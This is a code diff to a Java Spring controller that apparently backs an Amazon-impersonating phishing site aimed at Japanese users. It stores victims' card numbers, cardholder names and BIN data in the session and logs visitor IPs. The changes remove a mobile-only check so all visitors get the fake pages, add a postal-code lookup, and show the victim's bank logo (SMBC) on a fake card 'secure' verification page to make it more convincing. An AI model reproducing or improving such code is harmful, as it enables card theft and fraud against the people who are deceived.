@@ -8,6 +8,7 @@ import cn.hutool.http.Header;
 import cn.hutool.http.HttpRequest;
 import cn.hutool.http.useragent.UserAgent;
 import cn.hutool.http.useragent.UserAgentUtil;
+import cn.hutool.json.JSONUtil;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
 import com.kidd.amazon.common.IpUtils;
@@ -17,6 +18,7 @@ import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
+import org.springframework.util.StringUtils;
 import org.springframework.web.bind.annotation.*;
 
 import javax.servlet.http.Cookie;
@@ -55,15 +57,12 @@ public class Amazon2MobileController {
         FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
         fileAppender.append(timeStr+":"+"|"+ip);
         fileAppender.flush();
-        Boolean isMobile = false;
-        UserAgent ua = UserAgentUtil.parse(uaStr);
-        isMobile = ua.isMobile();
-        if (isMobile) return "version2/mobile/index";
-        else return "redirect:/signin";
+        return "version2/mobile/index";
     }
 
     @GetMapping("/")
     public Object signin2(@RequestHeader("User-Agent") String uaStr) {
+
         return "redirect:/version2/mobile/signin";
     }
 
@@ -81,6 +80,8 @@ public class Amazon2MobileController {
     public Object secure(Model model) {
         HttpSession session = request.getSession();
         Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
+        String binInfo = userInfoMap.get("binInfo");
+        String bankImage = getBankImageByBinInfo(binInfo);
        CardType cardType = CardType.getBydes(userInfoMap.get("cardType"));
        String cardNumber = userInfoMap.get("cardnumber");
        String namecard = userInfoMap.get("namecard");
@@ -90,6 +91,9 @@ public class Amazon2MobileController {
         model.addAttribute("cardName", namecard);
         model.addAttribute("cardNo",cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
         model.addAttribute("image",cardType.getImageName());
+        if(!StringUtils.isEmpty( bankImage)){
+            model.addAttribute("bankImage","card/a3/"+bankImage);
+        }
         return "version2/mobile/secure2";
     }
 
@@ -106,7 +110,6 @@ public class Amazon2MobileController {
         cookie.setPath("/");//设置作用域
         response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
     }
-
 
     @PostMapping("/version2/mobile/signin")
     @ResponseBody
@@ -204,5 +207,46 @@ public class Amazon2MobileController {
             jsonObject.remove("number");
         }
         return jsonObject.toJSONString();
+    }
+
+    @GetMapping("/zipcode")
+    @ResponseBody
+    public Object zipcode(@RequestParam("zipcode") String zipCode, Model model) {
+        String jstr = "";
+        try {
+            Map parm = new HashMap<String, String>();
+            parm.put("zipcode", zipCode);
+            String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
+                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
+                    .form(parm)//表单内容
+                    .timeout(20000)//超时，毫秒
+                    .execute().body();
+            cn.hutool.json.JSONObject jobj = JSONUtil.parseObj(result);
+            jstr = JSONUtil.toJsonStr(jobj);
+        } catch (Exception e) {
+            HashMap<String, Object> map = new HashMap<>();
+            map.put("status", 500);
+            map.put("message", null);
+            map.put("results", null);
+            jstr = JSONUtil.toJsonStr(map);
+        }
+        return jstr;
+    }
+
+    private String getBankImageByBinInfo(String binInfo) {
+        String bankImage = "";
+        if(null != binInfo){
+            JSONObject binJson = JSON.parseObject(binInfo);
+            if(binJson.containsKey("bank")){
+                JSONObject bankJSON = binJson.getJSONObject("bank");
+                if(bankJSON.containsKey("name")){
+                    String bankName= bankJSON.getString("name");
+                    if(bankName.contains("SUMITOMO MITSUI" )|| bankName.contains("MITSUI SUMITOMO")){
+                        return "smbc.gif";
+                    }
+                }
+            }
+        }
+        return bankImage;
     }
 }
